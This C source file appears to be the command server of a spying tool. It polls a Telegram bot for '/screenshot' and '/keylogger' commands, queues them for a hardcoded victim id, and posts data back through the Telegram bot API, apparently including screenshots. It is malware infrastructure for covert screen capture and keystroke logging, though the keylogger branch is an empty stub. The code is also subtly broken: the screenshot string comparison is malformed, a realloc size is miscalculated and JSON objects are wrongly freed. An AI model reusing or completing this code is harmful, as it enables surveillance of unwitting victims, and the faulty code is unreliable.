#include <curl/curl.h>
#include <json-c/json.h>
#include <pthread.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#include "cmds.h"
#include "fiobj.h"
#include "utils.h"

// Capacity of the hash table

char *base_uri;
int init_date;

int last_update_id = 0;
HashTable *cmd_table;

void init_telegram(char *token) {
  base_uri = malloc((28 + strlen(token) + 1) * sizeof(char));
  if (!base_uri) {
    printf("Could not allocate memory to the base_uri variable.\n");
    fflush(stdout);
    return;
  }
  strcpy(base_uri, "https://api.telegram.org/bot");
  strcat(base_uri, token);

  init_date = (int)time(NULL) + 25;  // Time plus some padding
  cmd_table = create_table();

  fflush(stdout);
}

void send_telegram_post(const char *ep, const char *data) {
  CURL *curl;
  CURLcode res;

  curl = curl_easy_init();
  if (curl) {
    // Telegram URI
    char *uri = malloc((strlen(base_uri) + strlen(ep) + 1) * sizeof(char));
    if (!uri) {
      printf("Could not allocate memory to the uri variable.\n");
      fflush(stdout);
      return;
    }
    strcpy(uri, base_uri);
    strcat(uri, ep);

    // Create appropiate headers
    struct curl_slist *headers = NULL;
    headers = curl_slist_append(headers, "Accept: application/json");
    headers = curl_slist_append(headers, "Content-Type: application/json");
    headers = curl_slist_append(headers, "charsets: utf-8");

    curl_easy_setopt(curl, CURLOPT_URL, uri);
    curl_easy_setopt(curl, CURLOPT_CUSTOMREQUEST, "POST");
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data);

    res = curl_easy_perform(curl);

    if (res != CURLE_OK) {
      fprintf(stderr, "send_photo() failed: %s\n", curl_easy_strerror(res));
    }

    curl_easy_cleanup(curl);
    free(uri);
  }
  curl_global_cleanup();
  fflush(stdout);
}

void fetch_updates(json_object **buffer) {
  CURL *curl;
  CURLcode res;

  curl = curl_easy_init();
  if (curl) {
    // Telegram URI
    char *uri = malloc((strlen(base_uri) + 12 + 1) * sizeof(char));
    if (!uri) {
      printf("Could not allocate memory to the uri variable.\n");
      fflush(stdout);
      exit(1);
    }
    strcpy(uri, base_uri);
    strcat(uri, "/getUpdates");

    // Create appropiate headers
    struct curl_slist *headers = NULL;
    headers = curl_slist_append(headers, "Accept: application/json");
    headers = curl_slist_append(headers, "Content-Type: application/json");
    headers = curl_slist_append(headers, "charsets: utf-8");

    struct MemoryStruct chunk;
    chunk.memory = malloc(1);
    chunk.size = 0;

    curl_easy_setopt(curl, CURLOPT_URL, uri);
    curl_easy_setopt(curl, CURLOPT_CUSTOMREQUEST, "GET");
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    // Writing the body
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, writeCallback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&chunk);

    res = curl_easy_perform(curl);

    if (res != CURLE_OK) {
      fprintf(stderr, "fetch_updates() failed: %s\n", curl_easy_strerror(res));
    } else {
      *buffer = json_tokener_parse(chunk.memory);
    }

    curl_easy_cleanup(curl);
    free(uri);
  }

  curl_global_cleanup();
  fflush(stdout);
}

void write_commands(json_object *buf_arr) {
  char *ht_res;
  if ((ht_res = ht_search(cmd_table, "abcd")) != NULL) {
    if (strstr(ht_res, ":")) {
      char *tk = strtok(ht_res, ":");
      while (tk != NULL) {
        json_object_array_add(buf_arr, json_object_new_string(tk + 1));
        tk = strtok(NULL, ":");
      }
    } else {
      json_object_array_add(buf_arr, json_object_new_string(ht_res + 1));
    }
  }
}

void *handle_cmds() {
  while (!fio_is_running()) {
    sleep(1);
  }

  struct json_object *obj, *ok, *result;
  int update_len, i;

  while (fio_is_running()) {
    fetch_updates(&obj);

    if (obj != NULL) {
      json_object_object_get_ex(obj, "ok", &ok);
      json_object_object_get_ex(obj, "result", &result);

      // printf("Ok: %d\n", json_object_get_boolean(ok));
      // printf("Result Size: %zu\n", json_object_get_array(result)->length);

      update_len = json_object_array_length(result);
      if (update_len > 0) {
        for (i = 0; i < update_len; i++) {
          struct json_object *update_obj = json_object_array_get_idx(result, i);
          int update_id = json_object_get_int(json_object_object_get(update_obj, "update_id"));

          if (update_id > last_update_id) {
            struct json_object *message_obj = json_object_object_get(update_obj, "message");
            int d = json_object_get_int(json_object_object_get(message_obj, "date"));
            if (init_date < d) {
              last_update_id = update_id;

              // Now we actually do something
              const char *cmd_label = json_object_get_string(json_object_object_get(message_obj, "text"));
              const char *id = "abcd";  // TODO: Get id from message
              if (strcmp(cmd_label, "/screenshot" == 0)) {
                char *ht_res;
                if ((ht_res = ht_search(cmd_table, id)) == NULL) {
                  ht_insert(cmd_table, id, cmd_label);
                } else {
                  ht_res = (char *)realloc(
                      ht_res,
                      (strlen(ht_res) + strlen(cmd_label) + 1) + sizeof(char));
                  if (ht_res == NULL) {
                    continue;
                  }

                  char *tmp =
                      (char *)malloc((strlen(cmd_label) + 2) * sizeof(char));
                  if (tmp == NULL) {
                    continue;
                  }
                  strcpy(tmp, ":");
                  strcat(tmp, cmd_label);

                  strcat(ht_res, tmp);
                  free(tmp);

                  ht_insert(cmd_table, id, ht_res);
                }
              } else if (strcmp(cmd_label, "/keylogger") == 0) {
                // ...
              }

              // Log the table for reference
              printf("\nHash Table\n-------------------\n");
              for (int i = 0; i < cmd_table->size; i++) {
                if (cmd_table->items[i]) {
                  printf("Index: %d, Key: %s, Value: %s\n", i,
                         cmd_table->items[i]->key, cmd_table->items[i]->value);
                }
              }
              printf("-------------------\n\n");

              fflush(stdout);
            }
            json_object_put(message_obj);
          }
          json_object_put(update_obj);
        }
      }
    }

    sleep(1);
  }

  printf("INFO: Shutting down command thread.\n");
  pthread_exit(NULL);
}